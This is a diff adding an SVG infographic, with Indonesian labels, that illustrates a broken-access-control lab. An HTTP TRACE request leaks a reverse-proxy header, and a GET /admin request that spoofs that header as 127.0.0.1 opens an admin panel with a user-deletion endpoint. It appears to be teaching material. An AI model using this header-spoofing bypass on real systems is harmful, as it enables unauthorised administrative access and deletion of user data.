@@ -1,0 +1,179 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 560" width="100%" height="100%">
+  <defs>
+    <!-- Background Gradient -->
+    <linearGradient id="bgGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+      <stop offset="0%" stop-color="#090D16"/>
+      <stop offset="50%" stop-color="#0F172A"/>
+      <stop offset="100%" stop-color="#090D16"/>
+    </linearGradient>
+
+    <!-- Card Backgrounds -->
+    <linearGradient id="cardGrad" x1="0%" y1="0%" x2="0%" y2="100%">
+      <stop offset="0%" stop-color="#1E293B" stop-opacity="0.95"/>
+      <stop offset="100%" stop-color="#0F172A" stop-opacity="0.95"/>
+    </linearGradient>
+
+    <linearGradient id="traceGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+      <stop offset="0%" stop-color="#1E1B4B"/>
+      <stop offset="100%" stop-color="#0F172A"/>
+    </linearGradient>
+
+    <linearGradient id="bypassGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+      <stop offset="0%" stop-color="#064E3B"/>
+      <stop offset="100%" stop-color="#022C22"/>
+    </linearGradient>
+
+    <!-- Glow Filters -->
+    <filter id="glowCyan" x="-20%" y="-20%" width="140%" height="140%">
+      <feGaussianBlur stdDeviation="6" result="blur" />
+      <feComposite in="SourceGraphic" in2="blur" operator="over" />
+    </filter>
+    <filter id="glowYellow" x="-20%" y="-20%" width="140%" height="140%">
+      <feGaussianBlur stdDeviation="6" result="blur" />
+      <feComposite in="SourceGraphic" in2="blur" operator="over" />
+    </filter>
+    <filter id="glowGreen" x="-20%" y="-20%" width="140%" height="140%">
+      <feGaussianBlur stdDeviation="6" result="blur" />
+      <feComposite in="SourceGraphic" in2="blur" operator="over" />
+    </filter>
+
+    <!-- Drop Shadow -->
+    <filter id="cardShadow" x="-10%" y="-10%" width="120%" height="125%">
+      <feDropShadow dx="0" dy="8" stdDeviation="12" flood-color="#000000" flood-opacity="0.5"/>
+    </filter>
+
+    <!-- Markers -->
+    <marker id="arrowCyan" markerWidth="10" markerHeight="10" refX="6" refY="3" orient="auto">
+      <path d="M0,0 L0,6 L8,3 z" fill="#38BDF8"/>
+    </marker>
+    <marker id="arrowYellow" markerWidth="10" markerHeight="10" refX="6" refY="3" orient="auto">
+      <path d="M0,0 L0,6 L8,3 z" fill="#FACC15"/>
+    </marker>
+    <marker id="arrowGreen" markerWidth="10" markerHeight="10" refX="6" refY="3" orient="auto">
+      <path d="M0,0 L0,6 L8,3 z" fill="#10B981"/>
+    </marker>
+  </defs>
+
+  <style>
+    .title { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-weight: 800; fill: #F8FAFC; }
+    .subtitle { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-weight: 500; fill: #94A3B8; }
+    .card-title { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-weight: 700; }
+    .code-text { font-family: 'JetBrains Mono', monospace; font-size: 11.5px; font-weight: 600; }
+    .desc-text { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 12px; fill: #CBD5E1; }
+    .badge { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 11px; font-weight: 700; }
+  </style>
+
+  <!-- Background Base -->
+  <rect width="1080" height="560" rx="16" fill="url(#bgGrad)"/>
+  <rect width="1080" height="560" rx="16" fill="none" stroke="#334155" stroke-width="1.5" stroke-opacity="0.6"/>
+
+  <!-- Subtle Grid Pattern -->
+  <g opacity="0.06" stroke="#94A3B8" stroke-width="1">
+    <line x1="0" y1="80" x2="1080" y2="80"/>
+    <line x1="0" y1="160" x2="1080" y2="160"/>
+    <line x1="0" y1="240" x2="1080" y2="240"/>
+    <line x1="0" y1="320" x2="1080" y2="320"/>
+    <line x1="0" y1="400" x2="1080" y2="400"/>
+    <line x1="0" y1="480" x2="1080" y2="480"/>
+    <line x1="120" y1="0" x2="120" y2="560"/>
+    <line x1="240" y1="0" x2="240" y2="560"/>
+    <line x1="360" y1="0" x2="360" y2="560"/>
+    <line x1="480" y1="0" x2="480" y2="560"/>
+    <line x1="600" y1="0" x2="600" y2="560"/>
+    <line x1="720" y1="0" x2="720" y2="560"/>
+    <line x1="840" y1="0" x2="840" y2="560"/>
+    <line x1="960" y1="0" x2="960" y2="560"/>
+  </g>
+
+  <!-- Header Section -->
+  <g transform="translate(48, 44)">
+    <rect x="0" y="0" width="125" height="24" rx="12" fill="#FACC15" fill-opacity="0.15" stroke="#FACC15" stroke-width="1"/>
+    <text x="62" y="16" text-anchor="middle" class="badge" fill="#FACC15">HTTP TRACE FLOW</text>
+    <text x="140" y="18" class="title" font-size="20">Broken Access Control: Debugging Flow via HTTP TRACE</text>
+    <text x="0" y="42" class="subtitle" font-size="13">Membongkar Header Internal &amp; Reverse Proxy untuk Menembus Pembatasan Akses Admin</text>
+  </g>
+
+  <!-- ==================== PHASE 1: TRACE REQUEST & DISCOVERY ==================== -->
+  <g transform="translate(48, 120)" filter="url(#cardShadow)">
+    <rect width="470" height="400" rx="14" fill="url(#traceGrad)" stroke="#818CF8" stroke-width="1.5"/>
+    
+    <!-- Header -->
+    <rect x="18" y="18" width="38" height="38" rx="8" fill="#4338CA" fill-opacity="0.3" stroke="#818CF8" stroke-width="1.5"/>
+    <path d="M26 32 h18 M38 26 l6 6 -6 6" stroke="#A5B4FC" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+    
+    <text x="68" y="34" class="card-title" font-size="15" fill="#A5B4FC">Tahap 1: Diagnosa Loopback (HTTP TRACE)</text>
+    <text x="68" y="50" class="desc-text" font-size="11.5" fill="#94A3B8">Penyerang mengirim method TRACE untuk melihat header proxy</text>
+
+    <line x1="18" y1="68" x2="452" y2="68" stroke="#334155" stroke-width="1"/>
+
+    <!-- Request Box -->
+    <rect x="16" y="80" width="438" height="110" rx="8" fill="#090D16" stroke="#3730A3" stroke-width="1"/>
+    <text x="26" y="100" class="badge" fill="#38BDF8">1. REQUEST PENYERANG KE SERVER:</text>
+    
+    <text x="26" y="122" class="code-text" fill="#38BDF8">TRACE / HTTP/1.1</text>
+    <text x="26" y="140" class="code-text" fill="#94A3B8">Host: target-website.com</text>
+    <text x="26" y="158" class="code-text" fill="#94A3B8">User-Agent: Mozilla/5.0 ...</text>
+    <text x="26" y="176" class="code-text" fill="#94A3B8">Cookie: session=xyz123</text>
+
+    <!-- Response Echo Box -->
+    <rect x="16" y="202" width="438" height="180" rx="8" fill="#1C1917" stroke="#CA8A04" stroke-width="1.2"/>
+    <text x="26" y="222" class="badge" fill="#FACC15">2. RESPONSE SERVER (MEMANTULKAN REQUEST + HEADER PROXY):</text>
+    
+    <text x="26" y="244" class="code-text" fill="#A7F3D0">HTTP/1.1 200 OK</text>
+    <text x="26" y="260" class="code-text" fill="#94A3B8">Content-Type: message/http</text>
+    <text x="26" y="280" class="code-text" fill="#CBD5E1">TRACE / HTTP/1.1</text>
+    <text x="26" y="296" class="code-text" fill="#CBD5E1">Host: target-website.com</text>
+    
+    <!-- Leaked Proxy Header Highlight -->
+    <rect x="22" y="304" width="424" height="42" rx="6" fill="#713F12" stroke="#EAB308" stroke-width="1" filter="url(#glowYellow)"/>
+    <text x="32" y="322" class="code-text" fill="#FEF08A" font-weight="700">X-Custom-IP-Authorization: 105.12.90.11</text>
+    <text x="32" y="338" class="badge" fill="#FDE047">🔥 HEADER RAHASIA REVERSE PROXY TERBONGKAR!</text>
+    
+    <text x="26" y="366" class="code-text" fill="#CBD5E1">Cookie: session=xyz123</text>
+  </g>
+
+  <!-- ==================== PHASE 2: ACCESS CONTROL BYPASS ==================== -->
+  <g transform="translate(558, 120)" filter="url(#cardShadow)">
+    <rect width="470" height="400" rx="14" fill="url(#bypassGrad)" stroke="#10B981" stroke-width="1.5"/>
+    
+    <!-- Header -->
+    <rect x="18" y="18" width="38" height="38" rx="8" fill="#047857" fill-opacity="0.3" stroke="#34D399" stroke-width="1.5"/>
+    <path d="M30 38 V32 A 7 7 0 0 1 44 32 V38 M26 38 H48 V48 H26 Z" fill="none" stroke="#6EE7B7" stroke-width="2"/>
+    <circle cx="37" cy="43" r="2" fill="#6EE7B7"/>
+    
+    <text x="68" y="34" class="card-title" font-size="15" fill="#6EE7B7">Tahap 2: Bypass Kontrol Akses (Admin Panel)</text>
+    <text x="68" y="50" class="desc-text" font-size="11.5" fill="#94A3B8">Memalsukan header internal menjadi localhost (127.0.0.1)</text>
+
+    <line x1="18" y1="68" x2="452" y2="68" stroke="#065F46" stroke-width="1"/>
+
+    <!-- Exploit Request Box -->
+    <rect x="16" y="80" width="438" height="150" rx="8" fill="#064E3B" fill-opacity="0.4" stroke="#059669" stroke-width="1"/>
+    <text x="26" y="100" class="badge" fill="#34D399">3. REQUEST BYPASS KE ENDPOINT ADMIN:</text>
+    
+    <text x="26" y="122" class="code-text" fill="#38BDF8">GET /admin HTTP/1.1</text>
+    <text x="26" y="140" class="code-text" fill="#94A3B8">Host: target-website.com</text>
+    
+    <!-- Injected Spoofed Header -->
+    <rect x="22" y="148" width="424" height="26" rx="4" fill="#047857" stroke="#34D399" stroke-width="1" filter="url(#glowGreen)"/>
+    <text x="32" y="165" class="code-text" fill="#A7F3D0" font-weight="700">X-Custom-IP-Authorization: 127.0.0.1</text>
+    <text x="320" y="165" class="badge" fill="#6EE7B7">← SPOOFED IP</text>
+    
+    <text x="26" y="194" class="code-text" fill="#94A3B8">Cookie: session=xyz123</text>
+    <text x="26" y="214" class="desc-text" font-size="11" fill="#A7F3D0">Backend mengira request berasal dari server lokal (Localhost)!</text>
+
+    <!-- Admin Panel Access Box -->
+    <rect x="16" y="242" width="438" height="140" rx="8" fill="#022C22" stroke="#10B981" stroke-width="1.2"/>
+    <text x="26" y="264" class="badge" fill="#6EE7B7">4. HASIL: AKSES ADMIN PANEL BERHASIL TERBUKA!</text>
+    
+    <rect x="26" y="278" width="418" height="34" rx="6" fill="#065F46" stroke="#34D399" stroke-width="1"/>
+    <text x="36" y="299" class="code-text" fill="#FFFFFF">HTTP/1.1 200 OK — Admin Dashboard Loaded</text>
+    
+    <text x="26" y="332" class="desc-text" font-size="11.5" fill="#D1FAE5">• Tombol hapus pengguna (/admin/delete?username=carlos) aktif</text>
+    <text x="26" y="352" class="desc-text" font-size="11.5" fill="#D1FAE5">• Pembatasan IP pada reverse proxy berhasil ditembus sepenuhnya</text>
+    <text x="26" y="372" class="badge" fill="#FACC15">🎉 STATUS: ACCESS CONTROL BYPASSED</text>
+  </g>
+
+  <!-- Flow Connector Arrow between Phase 1 and Phase 2 -->
+  <path d="M 518 320 L 558 320" fill="none" stroke="#FACC15" stroke-width="2.5" stroke-dasharray="5,4" marker-end="url(#arrowYellow)" filter="url(#glowYellow)"/>
+
+</svg>
